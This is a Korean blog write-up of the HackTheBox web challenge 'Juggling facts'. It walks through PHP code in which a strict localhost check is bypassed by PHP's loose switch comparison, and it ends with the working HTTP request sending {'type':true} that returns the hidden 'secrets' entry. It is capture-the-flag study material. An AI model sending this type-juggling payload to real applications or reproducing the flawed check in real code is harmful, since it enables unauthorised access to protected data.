---
title: "[HackTheBox] Juggling facts"
author: d0razi
date: 2024-01-25 10:59
categories: [InfoSec, Web]
tags: [Write up, HTB]
image: /assets/img/media/banner/HTB.jpg
---

```R
POST /api/getfacts HTTP/1.1
Host: 167.99.85.216:30988
Content-Length: 17
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/53
Content-Type: application/json
Accept: */*
Origin: http://167.99.85.216:30988
Referer: http://167.99.85.216:30988/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"type":"spooky"}
```

# 코드 분석
```php
<?php
class FactModel extends Model
{
	public function __construct()
	{
		parent::__construct();
	}
	public function get_facts($facts_type)
	{
		 $facts = $this->database->query('SELECT * FROM facts WHERE fact_type = ?',[
		's' => [
			$facts_type
			]
		]);
		return $facts->fetch_all(MYSQLI_ASSOC) ?? [];
	}
}
```

위 코드를 보면 `get_facts()`의 인자가 secret으로 전달되면 플래그를 획득할 수 있습니다.
```php
    public function getfacts($router)
    {
        $jsondata = json_decode(file_get_contents('php://input'), true);

        if ( empty($jsondata) || !array_key_exists('type', $jsondata))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }

        switch ($jsondata['type'])
        {
            case 'secrets':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('secrets')
                ]);

            case 'spooky':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('spooky')
                ]);
            
            case 'not_spooky':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('not_spooky')
                ]);
            
            default:
                return $router->jsonify([
                    'message' => 'Invalid type!'
                ]);
        }
    }
```

위 코드에서 `case 'secrets'` 부분을 보면 `get_facts('secrets)`를 볼 수 있습니다.

관련된 취약점을 찾아보다가 switch case 느슨한 비교 취약점을 찾았습니다.
https://lactea.kr/entry/%EB%B6%84%EC%84%9D%EC%9D%BC%EA%B8%B0-php-switch-case

아래와 같이 요청을 보내보니 플래그가 출력됐습니다.
```R
POST /api/getfacts HTTP/1.1
Host: 167.99.85.216:30988
Content-Length: 17
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/53
Content-Type: application/json
Accept: */*
Origin: http://167.99.85.216:30988
Referer: http://167.99.85.216:30988/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"type":true}
```
